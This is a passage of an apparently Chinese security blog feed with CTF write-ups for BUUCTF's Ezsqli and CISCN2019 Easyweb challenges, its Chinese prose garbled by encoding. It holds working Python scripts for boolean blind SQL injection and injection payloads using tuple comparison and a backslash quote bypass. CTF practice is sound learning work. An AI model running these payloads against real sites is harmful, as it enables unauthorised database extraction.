è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(sys.schema_table_statistics_with_buffer)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-built_in">print</span>(payload)<br>            data = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: payload<br>            &#125;<br>            <span class="hljs-comment"># print(begin,end,tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># r = requests.get(url + payload2, )</span><br>            r = requests.post(url=url, data=data)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;Occured&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240130222124116.png" alt="image-20240130222124116"></p><p>æ•°æ®è¡¨å:users233333333333333,f1ag_1s_h3r3_hhhhh</p><h2 id="æ— åˆ—åæ³¨å…¥æ³•"><a href="#æ— åˆ—åæ³¨å…¥æ³•" class="headerlink" title="æ— åˆ—åæ³¨å…¥æ³•:"></a>æ— åˆ—åæ³¨å…¥æ³•:</h2><p>ç”±äºç½‘é¡µè¿‡æ»¤äº†information_schemaï¼ŒåŒæ—¶sys.schema_table_statistics_with_bufferä¸å­˜å‚¨åˆ—åï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•è·å–æ•°æ®åº“çš„åˆ—åï¼Œæ‰€ä»¥åªèƒ½é‡‡ç”¨æ— åˆ—åçš„æ–¹å¼è¿›è¡Œæ³¨å…¥:</p><h3 id="æœ¬åœ°æ•°æ®åº“æµ‹è¯•"><a href="#æœ¬åœ°æ•°æ®åº“æµ‹è¯•" class="headerlink" title="æœ¬åœ°æ•°æ®åº“æµ‹è¯•:"></a>æœ¬åœ°æ•°æ®åº“æµ‹è¯•:</h3><h4 id="flagæ•°æ®è¡¨"><a href="#flagæ•°æ®è¡¨" class="headerlink" title="flagæ•°æ®è¡¨:"></a>flagæ•°æ®è¡¨:</h4><p><img src="/images/2024-2-3-Ezsqli/image-20240130224759763.png" alt="image-20240130224759763"></p><h5 id="sqlè¯­å¥"><a href="#sqlè¯­å¥" class="headerlink" title="sqlè¯­å¥:"></a>sqlè¯­å¥:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from flag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130224852251.png" alt="image-20240130224852251"></p><h4 id="mysqlçš„å…ƒç»„æ¯”è¾ƒæ³•"><a href="#mysqlçš„å…ƒç»„æ¯”è¾ƒæ³•" class="headerlink" title="mysqlçš„å…ƒç»„æ¯”è¾ƒæ³•:"></a>mysqlçš„å…ƒç»„æ¯”è¾ƒæ³•:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select (100,&#x27;g&#x27;)&gt;(select * from flag)<br>å…ƒç»„æ¯”è¾ƒæ³•è¦æ±‚&gt;å·¦å³ä¸¤è¾¹çš„å…ƒç´ æ•°é‡ä¸€è‡´ï¼Œå³(100,&#x27;a&#x27;)ä¸ºä¸¤ä¸ªå…ƒç´ 100å’Œ&#x27;a&#x27;,åˆ™(select * from flag)æŸ¥è¯¢å‡ºæ¥çš„ç»“æœé›†çš„å­—æ®µæ•°é‡ä¹Ÿè¦ä¸ºä¸¤ä¸ªï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™<br></code></pre></td></tr></table></figure><h5 id="æŠ¥é”™æƒ…å†µ"><a href="#æŠ¥é”™æƒ…å†µ" class="headerlink" title="æŠ¥é”™æƒ…å†µ:"></a>æŠ¥é”™æƒ…å†µ:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select (100,&#x27;g&#x27;,&#x27;a&#x27;)&gt;(select * from flag)<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Ezsqli/image-20240130225250981.png" alt="image-20240130225250981"></p><p>å®ƒä¼šè¦æ±‚&gt;åé¢çš„æ“ä½œè¯­å¥è‡³å°‘æŸ¥è¯¢å‡ºä¸‰ä¸ªå­—æ®µ</p><h5 id="æ¯”è¾ƒæ–¹å¼"><a href="#æ¯”è¾ƒæ–¹å¼" class="headerlink" title="æ¯”è¾ƒæ–¹å¼:"></a>æ¯”è¾ƒæ–¹å¼:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">select (100,&#x27;g&#x27;)&gt;(select * from flag)<br>å®ƒä¼šå…ˆå°†(100,&#x27;g&#x27;)çš„ç¬¬ä¸€ä¸ªå…ƒç´ å’Œ(select * from flag)çš„ç¬¬ä¸€ä¸ªå­—æ®µå…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ˜¯æ•°å€¼å‹åˆ™ç›´æ¥æ¯”è¾ƒæ•°å€¼å¤§å°ï¼Œå¦‚æœ100å¤§äº(select * from flag)çš„ç¬¬ä¸€ä¸ªå­—æ®µå…ƒç´ ï¼Œåˆ™ç›´æ¥è¿”å›trueï¼Œå³1<br><br>å¦‚æœ100ç­‰äº(select * from flag)çš„ç¬¬ä¸€ä¸ªå­—æ®µå…ƒç´ åˆ™ç»§ç»­æ¯”è¾ƒ(100,&#x27;g&#x27;)çš„ç¬¬äºŒä¸ªå…ƒç´ &#x27;g&#x27;ä¸(select * from flag)çš„ç¬¬äºŒä¸ªå­—æ®µå…ƒç´ çš„å¤§å°ï¼Œå­—ç¬¦ä¸²çš„å¤§å°æ¯”è¾ƒå’Œcè¯­è¨€çš„strcmp()ç›¸ä¼¼ï¼Œä»å­—ç¬¦ä¸²çš„å¤´ä¸€ä¸ªå­—ç¬¦å¼€å§‹æ¯”è¾ƒï¼Œå¦‚æœå‰é¢çš„å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§äºåä¸€ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ™è¿”å›1ï¼Œå°äºåˆ™ç›´æ¥è¿”å›0ï¼Œç›¸ç­‰ç»§ç»­æ¯”è¾ƒç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç¬¬äºŒä¸ªå­—ç¬¦å’Œç¬¬äºŒä¸ªå­—ç¬¦ä¸²çš„ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€åä¸€ä¸ªå­—ç¬¦<br><br>å¦‚æœ100å°äº(select * from flag)çš„ç¬¬ä¸€ä¸ªå­—æ®µå…ƒç´ åˆ™ç›´æ¥è¿”å›false,å³0<br></code></pre></td></tr></table></figure><p>äº†è§£äº†mysqlçš„å…ƒç»„æ¯”è¾ƒæ³•ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬éœ€è¦æ¸…æ¥šè¡¨çš„å­—æ®µä¸ªæ•°ï¼Œä½¿ç”¨payloadè¿›è¡Œæµ‹è¯•</p><h3 id="æ„é€ payloadè·å–è¡¨å­—æ®µæ•°"><a href="#æ„é€ payloadè·å–è¡¨å­—æ®µæ•°" class="headerlink" title="æ„é€ payloadè·å–è¡¨å­—æ®µæ•°:"></a>æ„é€ payloadè·å–è¡¨å­—æ®µæ•°:</h3><p>payload1:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (100)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p><img src="/2024/02/03/2024-2-3-Ezsqli/Typora_images\image-20240130230708594.png" alt="image-20240130230708594"></p><p>è¿”å›é”™è¯¯ï¼Œå³æ²¡æœ‰è¿”å›0æˆ–1çš„ä¸¤ç§å“åº”ä¿¡æ¯ï¼Œè¯´æ˜sqlè¯­å¥å‘ç”ŸæŠ¥é”™ï¼Œæ‰€ä»¥å­—æ®µæ•°ä¸æ˜¯1</p><p>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (100,111)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p><img src="/2024/02/03/2024-2-3-Ezsqli/Typora_images\image-20240130230831104.png" alt="image-20240130230831104"></p><p>è¿”å›0æ—¶çš„é¡µé¢ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥è¯æ˜f1ag_1s_h3r3_hhhhhè¡¨çš„å­—æ®µæ•°ä¸º2,æ¥ä¸‹æ¥å°±è¦ç¡®å®šf1ag_1s_h3r3_hhhhhè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ä¸ºå¤šå°‘</p><h3 id="æ„é€ payloadè¯æ˜f1ag-1s-h3r3-hhhhhè¡¨ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯ä»¥flag-å¼€å¤´ï¼š"><a href="#æ„é€ payloadè¯æ˜f1ag-1s-h3r3-hhhhhè¡¨ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯ä»¥flag-å¼€å¤´ï¼š" class="headerlink" title="æ„é€ payloadè¯æ˜f1ag_1s_h3r3_hhhhhè¡¨ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯ä»¥flag{å¼€å¤´ï¼š"></a>æ„é€ payloadè¯æ˜f1ag_1s_h3r3_hhhhhè¡¨ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯ä»¥flag{å¼€å¤´ï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (&#x27;flag&#123;&#x27;,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p>å› ä¸ºflagéƒ½å·²flag{xxxxx}çš„å½¢å¼å­˜åœ¨ï¼Œæ‰€ä»¥å¦‚æœç¬¬ä¸€ä¸ªå­—æ®µä¸ºflag{xxxx}ï¼Œåˆ™è¯¥payloadåº”è¯¥è¿”å›1^0:<br><img src="/2024/02/03/2024-2-3-Ezsqli/Typora_images\image-20240130232051526.png" alt="image-20240130232051526"></p><p>è¿”å›çš„æ˜¯1^0çš„æƒ…å†µï¼Œæ‰€ä»¥å¯ä»¥è¯´æ˜ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¯flagæ‰€åœ¨å­—æ®µï¼Œè¿™é‡Œå¦‚æœè¿”å›çš„æ˜¯1^1çš„æƒ…å†µæ—¶ï¼Œå¯èƒ½è¿˜éœ€è¦è€ƒè™‘æ›´å¤šçš„æƒ…å†µï¼Œå› ä¸ºå¦‚æœç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ç¡®å®æ¯”flag{å¤§å¦‚g666,åˆ™å°±æ— æ³•ç¡®å®šflagæ‰€åœ¨å­—æ®µäº†ï¼Œä½†è¿”å›1^0,åˆ™å¯ä»¥è¯´æ˜flagç»å¯¹ä¸åœ¨ç¬¬ä¸€ä¸ªå­—æ®µï¼Œä¸€èˆ¬æ¥è¯´ï¼Œæ•°æ®åº“è¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µéƒ½æ˜¯id,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥çŒœç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ä¸º0ï¼Œ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5â€¦â€¦..,ä¸€èˆ¬idéƒ½ä»1å¼€å§‹</p><h3 id="æ„é€ æœ€ç»ˆpayloadï¼š"><a href="#æ„é€ æœ€ç»ˆpayloadï¼š" class="headerlink" title="æ„é€ æœ€ç»ˆpayloadï¼š"></a>æ„é€ æœ€ç»ˆpayloadï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">id=1^(select (1,&#x27;xxxx&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><h4 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬:"></a>è„šæœ¬:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://9663941a-5bd2-4516-9b2b-8df811ed2df8.node5.buuoj.cn:81/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">128</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># print(&quot;tmp:&#123;&#125;&quot;.format(tmp))</span><br>        k = flag + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># print(&quot;k:&#123;&#125;&quot;.format(k))</span><br>        <span class="hljs-comment"># å®Œå–„payload</span><br>        payload = <span class="hljs-string">&quot;1^((select * from f1ag_1s_h3r3_hhhhh)&gt;(1,&#x27;&#123;&#125;&#x27;))&quot;</span>.<span class="hljs-built_in">format</span>(k)<br>        data = &#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;<br>        <span class="hljs-built_in">print</span>(payload)<br>        r = requests.post(url=url, data=data)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-comment"># 1^1çš„è¿”å›å†…å®¹ï¼Œtrueçš„æƒ…å†µ</span><br>        true_text = <span class="hljs-string">&quot;Occured&quot;</span><br>        <span class="hljs-keyword">if</span> true_text <span class="hljs-keyword">in</span> r.text:<br>            begin = tmp + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp     <br>        tmp = (begin + end) // <span class="hljs-number">2</span>    <br>    <span class="hljs-keyword">if</span> tmp == <span class="hljs-number">33</span>:<br>        <span class="hljs-keyword">break</span> <br>    <span class="hljs-comment"># è¾“å‡ºflag</span><br>    flag = flag + <span class="hljs-built_in">chr</span>(tmp-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:flagä¸º:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i, flag))<br><span class="hljs-comment"># è¾“å‡ºå®Œæ•´çš„flag</span><br><span class="hljs-built_in">print</span>(flag.lower())<br><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2024-2-3-Ezsqli/image-20240131005542728.png" alt="image-20240131005542728"></p><p>flag&#x3D;flag{8999877f-b643-40e3-822c-86d8604fd977}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</title>
    <link href="/2024/02/03/2024-2-3-Easyweb%20/"/>
    <url>/2024/02/03/2024-2-3-Easyweb%20/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><h2 id="è®¿é—®ç½‘é¡µçš„robots-txt"><a href="#è®¿é—®ç½‘é¡µçš„robots-txt" class="headerlink" title="è®¿é—®ç½‘é¡µçš„robots.txt:"></a>è®¿é—®ç½‘é¡µçš„robots.txt:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130133211639.png" alt="image-20240130133211639"></p><p>å‘ç°ç½‘é¡µå¯ä»¥è®¿é—®.php.bakæ–‡ä»¶ï¼Œä¸”åŒ¹é…çš„æ–‡ä»¶åä¸º*å³æ‰€æœ‰æ–‡ä»¶çš„éƒ½å¯ä»¥ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå°è¯•ä¸€ä¸‹index.php.bak</p><h2 id="è®¿é—®ä¸€ä¸‹index-php-bak"><a href="#è®¿é—®ä¸€ä¸‹index-php-bak" class="headerlink" title="è®¿é—®ä¸€ä¸‹index.php.bak:"></a>è®¿é—®ä¸€ä¸‹index.php.bak:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130133405133.png" alt="image-20240130133405133"></p><p>å‘ç°ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œåœ¨ç½‘é¡µçš„å‰ç«¯ä¸­è¿˜å­˜åœ¨ä»¥ä¸‹phpæ–‡ä»¶:</p><p><img src="/images/2023-08-20-Easyweb/image-20240130133457309.png" alt="image-20240130133457309"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">image.php<br>user.php<br></code></pre></td></tr></table></figure><h2 id="è®¿é—®ä¸Šè¿°æ–‡ä»¶çš„-php-bakæ–‡ä»¶"><a href="#è®¿é—®ä¸Šè¿°æ–‡ä»¶çš„-php-bakæ–‡ä»¶" class="headerlink" title="è®¿é—®ä¸Šè¿°æ–‡ä»¶çš„.php.bakæ–‡ä»¶:"></a>è®¿é—®ä¸Šè¿°æ–‡ä»¶çš„.php.bakæ–‡ä»¶:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130133601310.png" alt="image-20240130133601310"></p><p>æˆåŠŸè·å–image.php.bakæ–‡ä»¶ï¼ï¼ï¼</p><h2 id="å¯¹image-phpè¿›è¡Œä»£ç 1å®¡è®¡"><a href="#å¯¹image-phpè¿›è¡Œä»£ç 1å®¡è®¡" class="headerlink" title="å¯¹image.phpè¿›è¡Œä»£ç 1å®¡è®¡:"></a>å¯¹image.phpè¿›è¡Œä»£ç 1å®¡è®¡:</h2><p>image.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-comment">// GETè¯·æ±‚æ–¹å¼è·å–id,å¦‚æœidä¸ºç©ºåˆ™è‡ªåŠ¨èµ‹å€¼ä¸º1</span><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-comment">// GETè¯·æ±‚æ–¹å¼è·å–pathå˜é‡çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰åˆ™è‡ªåŠ¨èµ‹å€¼ä¸ºç©º</span><br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment">// åœ¨ç”¨ä¹¦è¾“å…¥çš„å†…å®¹ä¸­çš„ç‰¹æ®Šå­—ç¬¦å‰é¢åŠ åæ–œæ ï¼Œç”¨æˆ·å‡å°‘å®‰å…¨éšæ‚£</span><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">// å°†è¢«æ·»åŠ çš„åæ–œæ çš„æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤</span><br><span class="hljs-comment">// ç‰¹æ®Šå­—ç¬¦:null,&#x27;,&quot;,\</span><br><span class="hljs-comment">// æ›¿æ¢çš„å†…å®¹:\0,%00,&#x27;,\&#x27;</span><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">// sqlæŸ¥è¯¢å›¾ç‰‡è·¯å¾„</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><span class="hljs-comment">// è·å–å®Œæ•´çš„å½“å‰ç½‘ç«™ä¸‹çš„å›¾ç‰‡è·¯å¾„</span><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-comment">// è¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹è¾“å‡ºåˆ°æµè§ˆå™¨ä¸­</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><h3 id="å®¡è®¡åˆ†æ"><a href="#å®¡è®¡åˆ†æ" class="headerlink" title="å®¡è®¡åˆ†æ:"></a>å®¡è®¡åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">é€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“image.phpå­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œæ³¨å…¥ç‚¹æœ‰idå’Œpathä¸¤ä¸ª<br>-- &#x27;ä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨#è¿›è¡Œæ³¨é‡Š<br>image.phpåªè¿”å›æ–‡ä»¶çš„è¯»å–ä¿¡æ¯ï¼Œæ²¡æœ‰å¯¹mysqlçš„æŸ¥è¯¢å†…å®¹ä»¥åŠæŠ¥é”™å†…å®¹è¿›è¡Œè¿”å›ï¼Œåªèƒ½ä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥é‡‡ç”¨æ—¶é—´ç›²æ³¨<br>ç”±äº&#x27;è¢«è¿‡æ»¤ï¼Œè€Œimage.phpçš„sqlè¯­å¥é‡‡ç”¨çš„æ˜¯&#x27;è¿›è¡Œé—­åˆï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œç»•è¿‡<br></code></pre></td></tr></table></figure><h2 id="åæ–œæ ç»•è¿‡æ³•"><a href="#åæ–œæ ç»•è¿‡æ³•" class="headerlink" title="åæ–œæ ç»•è¿‡æ³•:"></a>åæ–œæ ç»•è¿‡æ³•:</h2><h3 id="ä½¿ç”¨åæ–œæ æ„é€ sqlè¯­å¥"><a href="#ä½¿ç”¨åæ–œæ æ„é€ sqlè¯­å¥" class="headerlink" title="ä½¿ç”¨åæ–œæ æ„é€ sqlè¯­å¥:"></a>ä½¿ç”¨åæ–œæ æ„é€ sqlè¯­å¥:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 